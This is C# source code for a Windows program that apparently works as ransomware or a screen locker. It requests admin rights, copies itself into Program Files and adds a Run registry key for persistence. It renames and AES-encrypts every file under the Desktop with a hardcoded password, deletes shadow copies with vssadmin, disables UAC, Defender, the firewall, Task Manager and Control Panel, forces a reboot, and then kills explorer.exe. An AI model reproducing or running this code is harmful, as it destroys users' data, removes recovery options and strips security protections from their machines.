using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Diagnostics;
using System.Collections.Generic;

namespace myapp
{
    static class Program
    {
        [DllImport("User32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, int fWinIni);
        [STAThread]
        static void Main(string[] args)
        {
            string programFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
            string currentDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(WindowsBuiltInRole.Administrator);

            if (!isAdmin && !currentDirectory.Equals(programFilesPath, StringComparison.InvariantCultureIgnoreCase))
            {
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = Application.ExecutablePath;
                startInfo.Verb = "runas";
                try
                {
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    MessageBox.Show("Error: " + ex.Message);
                }
                Application.Exit();
            }
            else
            {
                //encrypted itself issue 

                string appName = Path.GetFileNameWithoutExtension(Application.ExecutablePath);

                if (!currentDirectory.Equals(programFilesPath, StringComparison.InvariantCultureIgnoreCase))
                {
                    SystemParametersInfo(0x0014, 0, null, 0x01 | 0x02);

                    string targetPath = Path.Combine(programFilesPath, appName);
                    if (!File.Exists(targetPath))
                    {
                        File.Copy(Application.ExecutablePath, targetPath, true);
                    }

                    RegistryKey rk = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue(appName, targetPath, RegistryValueKind.String);

                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
                    string[] files = Directory.GetFiles(desktopPath, "*.*", SearchOption.AllDirectories);

                    int currentProcessId = Process.GetCurrentProcess().Id;
                    var processIds = Process.GetProcessesByName(appName)
                                            .Where(p => p.Id != currentProcessId)
                                            .Select(p => p.Id)
                                            .ToList();

                    for (int i = 0; i < files.Length; i++)
                    {
                        string filePath = files[i];
                        string fileName = Path.GetFileNameWithoutExtension(filePath);
                        string fileExtension = Path.GetExtension(filePath);

                        if (fileName.Equals(appName, StringComparison.InvariantCultureIgnoreCase))
                        {
                            continue;
                        }

                        string newFileName = "JohnCENA" + (i + 1) + ".JohnCENA";
                        string newFilePath = Path.Combine(Path.GetDirectoryName(filePath), newFileName);
                        File.Move(filePath, newFilePath);

                        if (!processIds.Contains(currentProcessId))
                        {
                            EncryptFile(newFilePath, "test123", new byte[16], new byte[16]);
                        }
                    }

                    DisableUAC();

                    Process.Start("shutdown.exe", "-r -t 0");
                }
                else
                {
                    Process.Start("taskkill", "/f /im explorer.exe");

                    Application.EnableVisualStyles();
                    Application.SetCompatibleTextRenderingDefault(false);
                    Application.Run(new Form1());
                }


            }
        }


        static void EncryptFile(string filePath, string password, byte[] salt, byte[] iv)
        {
            using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open))
            {
                using (FileStream outputFileStream = new FileStream(filePath + ".enc", FileMode.Create))
                {
                    using (AesManaged aes = new AesManaged())
                    {
                        aes.KeySize = 256;
                        aes.BlockSize = 128;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;

                        Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, salt, 1000);
                        aes.Key = key.GetBytes(aes.KeySize / 8);
                        aes.IV = iv;

                        using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            inputFileStream.CopyTo(cryptoStream);
                        }
                    }
                }
            }
        }
        static void DisableUAC()
        { 
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", 0, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender", "ServiceKeepAlive", 0, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates", "ForceUpdateFromMU", 0, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1, RegistryValueKind.DWord);
            //var runKeyLocal = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //runKeyLocal?.SetValue(Application.ProductName, Application.ExecutablePath);
            //runKeyLocal?.Close();
            //var runKeyCurrentUser = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //runKeyCurrentUser?.SetValue(Application.ProductName, Application.ExecutablePath);
            //runKeyCurrentUser?.Close();
            //var runKeyWow6432Node = Registry.LocalMachine.OpenSubKey(@"Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run", true);
            //runKeyWow6432Node?.SetValue(Application.ProductName, Application.ExecutablePath);
            //runKeyWow6432Node?.Close();
            Process.Start("cmd.exe", "/c vssadmin delete shadows /all /quiet")?.WaitForExit();
            Process.Start("cmd.exe", "/c NetSh Advfirewall set allprofiles state off")?.WaitForExit();
        }
    }
}








